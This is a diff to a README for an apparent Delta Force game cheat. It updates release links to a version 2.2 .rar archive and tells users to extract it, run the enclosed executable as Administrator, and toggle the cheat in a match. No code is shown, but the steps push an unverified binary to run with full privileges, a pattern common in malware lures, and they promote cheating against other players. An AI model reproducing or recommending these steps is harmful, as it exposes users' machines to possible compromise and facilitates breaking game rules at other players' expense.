@@ -65,13 +65,13 @@
 | **runtime** | Visual C++ Redistributable 2015–2022 |
 
 
-## ▸ [installation](https://github.com/VisibleMaharaja/Delta-Force-Cheat/releases/download/Delta-Force2.1/Delta-Force2.1.rar)
+## ▸ [installation](https://github.com/VisibleMaharaja/Delta-Force-Cheat/releases/download/Delta-Force2.2/Delta-Force2.2.rar)
 
-**1.** download the latest release from the **[Releases](https://github.com/VisibleMaharaja/Delta-Force-Cheat/releases/download/Delta-Force2.1/Delta-Force2.1.rar)** tab
+**1.** download the latest release from the **[Releases](https://github.com/VisibleMaharaja/Delta-Force-Cheat/releases/download/Delta-Force2.2/Delta-Force2.2.rar)** tab
 
 **2.** extract archive
 
-**3.** run the `Delta-Force2.1.exe` as **Administrator**
+**3.** run the `Delta-Force2.2.exe` as **Administrator**
 
 **4.** launch Delta Force, enter a match, press `INSERT` or `DELETE`
 
